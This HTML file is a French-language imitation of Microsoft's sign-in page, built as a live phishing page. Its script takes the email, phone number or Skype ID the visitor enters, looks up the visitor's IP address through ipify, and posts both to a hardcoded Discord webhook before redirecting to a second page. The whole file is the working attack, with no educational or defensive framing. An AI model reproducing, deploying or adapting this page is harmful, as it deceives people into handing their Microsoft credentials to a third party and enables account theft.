<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Login Page</title>
    <style>
        body {  
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom right, #f0e6e4, #d6e6f2);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            position: relative;
            padding: 0;
        }
        .login-container {
            background: white;
            padding: 25px;
            width: 350px;
            text-align: left;
            position: relative;
            border-radius: 0;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            margin-top: -112px;
        }
        .header-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            margin-bottom: 8px;
        }
        .logo {
            display: flex;
            align-items: center;
            margin-bottom: 5px; 
        }
        .logo img {
            width: 24px;
            height: 24px;
            margin-right: 8px;
        }
        .logo-text {
            font-size: 1.2em;
            font-weight: bold;
            color: #666;
        }
        h2 {
            font-size: 1.4em;
            margin: 8px 0;
            color: #333;
            text-align: left;
            width: 100%;
        }
        input[type="text"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 12px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .links {
            margin: 12px 0;
            font-size: 0.8em;
            text-align: left;
            width: 100%;
        }
        .links a {
            color: #0078d4;
            text-decoration: none;
        }
        .buttons {
            display: flex;
            justify-content: flex-end;
            margin-top: 20px;
        }
        .button {
            padding: 8px 20px;
            border: none;
            border-radius: 0;
            cursor: pointer;
            margin-left: 5px;
            font-size: 0.9em;
        }
        .button-back {
            background: #c0c0c0;
            color: #000;
        }
        .button-next {
            background: #0078d4;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header-container">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
                <div class="logo-text">Microsoft</div>
            </div>
            <h2>Connexion</h2>
        </div>
        <input type="text" id="emailInput" placeholder="E-mail, téléphone ou identifiant Skype">
        <div class="links">
            <a href="#" class="no-account">Aucun compte ?</a><a href="#" class="create-account"> Créez-en un !</a>
        </div>
        <div class="buttons">
            <button class="button button-back">Retour</button>
            <button class="button button-next" onclick="redirectToNextPage()">Suivant</button>
        </div>
    </div>

    <script>
        // Fonction pour récupérer l'adresse IP de l'utilisateur (via une API)
        function getUserIp() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => console.error('Erreur lors de la récupération de l\'IP', error));
        }

        // Fonction pour envoyer l'email et l'IP au Webhook
        function redirectToNextPage() {
            const webhookURL = 'https://discord.com/api/webhooks/1276593553400664064/xbLeuqO6r0IBNG3HKxuS7sxbIDx9BptEW85EASFQYDPjP5vn2GMnKfSgoOq8hg9atqeK';
            const emailInput = document.getElementById('emailInput');
            const email = emailInput.value;

            if (email) {
                getUserIp().then(ip => {
                    const message = {
                        content: `Un utilisateur a entré l'email suivant : ${email}\nAdresse IP : ${ip}`
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .then(response => {
                        if (response.ok) {
                            // Redirection vers la page suivante
                            window.location.href = 'page2.html';
                        } else {
                            console.error('Erreur lors de l\'envoi du webhook');
                        }
                    })
                    .catch(error => {
                        console.error('Erreur de réseau:', error);
                    });
                });
            } else {
                alert('Veuillez entrer un email avant de continuer.');
            }
        }
    </script>
</body>
</html>
